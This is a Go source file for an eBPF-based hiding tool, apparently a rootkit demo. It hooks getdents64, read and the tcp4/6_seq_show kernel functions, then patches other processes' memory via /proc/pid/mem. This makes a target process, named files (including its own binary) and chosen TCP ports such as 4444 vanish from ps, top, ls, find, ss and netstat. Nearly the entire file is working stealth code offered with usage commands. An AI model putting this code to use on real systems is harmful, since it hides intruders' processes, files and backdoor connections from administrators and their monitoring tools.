// SPDX-License-Identifier: GPL-2.0
// ebpf-hide-proc: hide processes, files and network connections
// using eBPF + /proc/pid/mem patching
//
// Architecture:
//   Kernel eBPF:
//     - hooks getdents64 for process & file hiding
//     - hooks tcp4/6_seq_show + read for network hiding
//     - sends events via ringbuf
//   Go userspace:
//     - receives events, patches caller memory via /proc/pid/mem
//
// Usage:
//   sudo ./ebpf-hide-proc                              # hide self process
//   sudo ./ebpf-hide-proc -hide-self-file               # + hide own binary
//   sudo ./ebpf-hide-proc -hide-file secret.txt         # hide a file
//   sudo ./ebpf-hide-proc -hide-port 4444               # hide port 4444
//   sudo ./ebpf-hide-proc -hide-port 22 -hide-port 8080 # hide multiple ports

package main

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -cflags "-O2 -g -Wall -target bpf" -target amd64 hideProc ./bpf/hide_proc.c

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

const nameMax = 64

const (
	evtHidePID  = 1
	evtHideFile = 2
	evtHideNet  = 3
)

// Dirent hide event (process + file)
type hideEvent struct {
	EvtType   uint8
	Pad0      [3]byte
	CallerPID uint32
	CallerTID uint32
	Pad1      uint32
	BufAddr   uint64
	EntryOff  uint64
	EntryRecl uint16
	PrevRecl  uint16
	Pad2      uint32
	PrevOff   uint64
	TotalSize int64
	DName     [nameMax]byte
}

// Network hide event
type netHideEvent struct {
	EvtType    uint8
	Pad0       [3]byte
	CallerPID  uint32
	CallerTID  uint32
	LocalPort  uint16
	RemotePort uint16
	BufAddr    uint64
	BufLen     int64
}

// Multi-value flags
type stringSlice []string

func (s *stringSlice) String() string { return strings.Join(*s, ", ") }
func (s *stringSlice) Set(v string) error {
	*s = append(*s, v)
	return nil
}

type intSlice []int

func (s *intSlice) String() string {
	strs := make([]string, len(*s))
	for i, v := range *s {
		strs[i] = strconv.Itoa(v)
	}
	return strings.Join(strs, ", ")
}
func (s *intSlice) Set(v string) error {
	n, err := strconv.Atoi(v)
	if err != nil {
		return fmt.Errorf("invalid port: %s", v)
	}
	if n < 1 || n > 65535 {
		return fmt.Errorf("port out of range: %d", n)
	}
	*s = append(*s, n)
	return nil
}

func main() {
	var targetPID int
	var hideFiles stringSlice
	var hidePorts intSlice
	var hideSelfFile bool

	flag.IntVar(&targetPID, "pid", 0, "PID to hide (default: self)")
	flag.Var(&hideFiles, "hide-file", "file name to hide (repeatable)")
	flag.Var(&hidePorts, "hide-port", "TCP port to hide from ss/netstat (repeatable)")
	flag.BoolVar(&hideSelfFile, "hide-self-file", false, "hide own binary file")
	flag.Parse()

	if targetPID == 0 {
		targetPID = os.Getpid()
	}
	if hideSelfFile {
		exe, err := os.Executable()
		if err == nil {
			hideFiles = append(hideFiles, filepath.Base(exe))
		}
	}

	pidStr := strconv.Itoa(targetPID)
	doFile := len(hideFiles) > 0
	doNet := len(hidePorts) > 0

	log.Printf("=== eBPF Process, File & Network Hider Demo ===")
	log.Printf("Target PID: %d (%s)", targetPID, pidStr)
	log.Printf("My PID:     %d", os.Getpid())
	if doFile {
		log.Printf("Hide files: %v", []string(hideFiles))
	}
	if doNet {
		log.Printf("Hide ports: %v", []int(hidePorts))
	}

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("memlock: %v", err)
	}

	objs := hideProcObjects{}
	if err := loadHideProcObjects(&objs, nil); err != nil {
		log.Fatalf("load eBPF: %v", err)
	}
	defer objs.Close()

	// --- PID setup ---
	var pidVal, pidMask uint64
	pidBytes := []byte(pidStr + "\x00")
	for i := 0; i < len(pidBytes) && i < 8; i++ {
		pidVal |= uint64(pidBytes[i]) << (i * 8)
		pidMask |= 0xFF << (i * 8)
	}
	log.Printf("PID match: val=0x%016x mask=0x%016x", pidVal, pidMask)

	putU64 := func(m interface{ Put(any, any) error }, key uint32, val uint64) {
		buf := make([]byte, 8)
		binary.LittleEndian.PutUint64(buf, val)
		if err := m.Put(key, buf); err != nil {
			log.Fatalf("map put: %v", err)
		}
	}
	putU64(objs.PidValMap, 0, pidVal)
	putU64(objs.PidMaskMap, 0, pidMask)

	// --- File name setup ---
	if doFile {
		for _, fname := range hideFiles {
			key, mask := encodeNameU64(fname)
			keyBuf := make([]byte, 8)
			maskBuf := make([]byte, 8)
			binary.LittleEndian.PutUint64(keyBuf, key)
			binary.LittleEndian.PutUint64(maskBuf, mask)
			if err := objs.FileNameMap.Put(keyBuf, maskBuf); err != nil {
				log.Fatalf("set file '%s': %v", fname, err)
			}
			log.Printf("File match: '%s' key=0x%016x mask=0x%016x", fname, key, mask)
		}
	}

	// --- Port setup ---
	if doNet {
		for _, port := range hidePorts {
			k := uint32(port)
			v := uint32(1)
			if err := objs.HidePortsMap.Put(k, v); err != nil {
				log.Fatalf("set port %d: %v", port, err)
			}
		}
	}

	// --- Feature flags ---
	objs.FeatureMap.Put(uint32(0), uint32(1)) // pid hiding always on
	fileFlag := uint32(0)
	if doFile {
		fileFlag = 1
	}
	objs.FeatureMap.Put(uint32(1), fileFlag)
	netFlag := uint32(0)
	if doNet {
		netFlag = 1
	}
	objs.FeatureMap.Put(uint32(2), netFlag)

	// --- Attach tracepoints ---
	tpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64",
		objs.TracepointSysEnterGetdents64, nil)
	if err != nil {
		log.Fatalf("attach getdents enter: %v", err)
	}
	defer tpEnter.Close()

	tpExit, err := link.Tracepoint("syscalls", "sys_exit_getdents64",
		objs.TracepointSysExitGetdents64, nil)
	if err != nil {
		log.Fatalf("attach getdents exit: %v", err)
	}
	defer tpExit.Close()

	// --- Attach network hooks (if enabled) ---
	if doNet {
		// kprobe tcp4_seq_show
		kp4, err := link.Kprobe("tcp4_seq_show", objs.KprobeTcp4SeqShow, nil)
		if err != nil {
			log.Fatalf("kprobe tcp4_seq_show: %v", err)
		}
		defer kp4.Close()

		// kprobe tcp6_seq_show
		kp6, err := link.Kprobe("tcp6_seq_show", objs.KprobeTcp6SeqShow, nil)
		if err != nil {
			log.Printf("kprobe tcp6_seq_show: %v (tcp6 hiding disabled)", err)
		} else {
			defer kp6.Close()
		}

		// read tracepoints
		tpReadEnter, err := link.Tracepoint("syscalls", "sys_enter_read",
			objs.TracepointSysEnterRead, nil)
		if err != nil {
			log.Fatalf("attach read enter: %v", err)
		}
		defer tpReadEnter.Close()

		tpReadExit, err := link.Tracepoint("syscalls", "sys_exit_read",
			objs.TracepointSysExitRead, nil)
		if err != nil {
			log.Fatalf("attach read exit: %v", err)
		}
		defer tpReadExit.Close()
	}

	rd, err := ringbuf.NewReader(objs.Events)
	if err != nil {
		log.Fatalf("ringbuf: %v", err)
	}
	defer rd.Close()

	log.Println("eBPF attached!")
	log.Println()
	log.Printf(">>> Process %d is now HIDDEN from ps / top <<<", targetPID)
	if doFile {
		log.Printf(">>> Files %v are HIDDEN from ls / find <<<", []string(hideFiles))
	}
	if doNet {
		log.Printf(">>> Ports %v are HIDDEN from ss / netstat <<<", []int(hidePorts))
	}
	log.Println()
	log.Println("Press Ctrl+C to stop.")

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		log.Printf("\nStopping.")
		rd.Close()
	}()

	pidCnt, fileCnt, netCnt := 0, 0, 0
	for {
		rec, err := rd.Read()
		if err != nil {
			if err.Error() == "ringbuf reader was closed" {
				break
			}
			continue
		}

		if len(rec.RawSample) < 1 {
			continue
		}
		evtType := rec.RawSample[0]

		switch evtType {
		case evtHidePID, evtHideFile:
			var ev hideEvent
			if err := binary.Read(bytes.NewReader(rec.RawSample),
				binary.LittleEndian, &ev); err != nil {
				continue
			}
			if patchDirent(&ev) {
				name := string(bytes.TrimRight(ev.DName[:], "\x00"))
				if evtType == evtHidePID {
					pidCnt++
					log.Printf("[hide-pid #%d] Removed '%s' from PID %d's readdir (offset=%d)",
						pidCnt, name, ev.CallerPID, ev.EntryOff)
				} else {
					fileCnt++
					log.Printf("[hide-file #%d] Removed '%s' from PID %d's readdir (offset=%d)",
						fileCnt, name, ev.CallerPID, ev.EntryOff)
				}
			}

		case evtHideNet:
			var nev netHideEvent
			if err := binary.Read(bytes.NewReader(rec.RawSample),
				binary.LittleEndian, &nev); err != nil {
				continue
			}
			if patchNetRead(&nev, hidePorts) {
				netCnt++
				log.Printf("[hide-net #%d] Scrubbed port %d (remote %d) from PID %d's read buffer",
					netCnt, nev.LocalPort, nev.RemotePort, nev.CallerPID)
			}
		}
	}
	log.Printf("Total hides: pid=%d file=%d net=%d", pidCnt, fileCnt, netCnt)
}

// encodeNameU64 encodes a file name's first 8 bytes as a u64 key
func encodeNameU64(name string) (val, mask uint64) {
	nameBytes := []byte(name + "\x00")
	n := len(nameBytes)
	if n > 8 {
		n = 8
		nameBytes = []byte(name)[:8]
	}
	for i := 0; i < n; i++ {
		val |= uint64(nameBytes[i]) << (i * 8)
		mask |= 0xFF << (i * 8)
	}
	return
}

// patchDirent patches getdents64 buffer to hide a dirent entry
func patchDirent(ev *hideEvent) bool {
	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", ev.CallerPID), os.O_RDWR, 0)
	if err != nil {
		return false
	}
	defer f.Close()

	maxBad := uint64(0xFFFFFFFF00000000)
	if ev.PrevOff < maxBad && ev.PrevRecl > 0 {
		addr := int64(ev.BufAddr + ev.PrevOff + 16)
		buf := make([]byte, 2)
		if _, err := f.ReadAt(buf, addr); err != nil {
			return false
		}
		cur := binary.LittleEndian.Uint16(buf)
		binary.LittleEndian.PutUint16(buf, cur+ev.EntryRecl)
		_, err := f.WriteAt(buf, addr)
		return err == nil
	}

	_, err = f.WriteAt(make([]byte, 8), int64(ev.BufAddr+ev.EntryOff))
	return err == nil
}

// patchNetRead patches the userspace read buffer to remove lines matching hidden ports
func patchNetRead(nev *netHideEvent, ports intSlice) bool {
	if nev.BufLen <= 0 || nev.BufLen > 1024*1024 {
		return false
	}

	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", nev.CallerPID), os.O_RDWR, 0)
	if err != nil {
		return false
	}
	defer f.Close()

	// Read the buffer content
	buf := make([]byte, nev.BufLen)
	n, err := f.ReadAt(buf, int64(nev.BufAddr))
	if err != nil || n == 0 {
		return false
	}
	buf = buf[:n]

	// Build port hex strings to match (format: ":XXXX " in /proc/net/tcp)
	portHexes := make([]string, 0, len(ports))
	for _, p := range ports {
		portHexes = append(portHexes, fmt.Sprintf(":%04X ", p))
	}

	// Process line by line
	patched := false
	lines := bytes.Split(buf, []byte("\n"))
	for i, line := range lines {
		if len(line) == 0 {
			continue
		}
		lineStr := string(line)
		for _, ph := range portHexes {
			if strings.Contains(lineStr, ph) {
				// Replace line content with spaces (preserve length and newline position)
				replacement := bytes.Repeat([]byte(" "), len(line))
				offset := int64(0)
				for j := 0; j < i; j++ {
					offset += int64(len(lines[j])) + 1 // +1 for \n
				}
				f.WriteAt(replacement, int64(nev.BufAddr)+offset)
				patched = true
				break
			}
		}
	}
	return patched
}
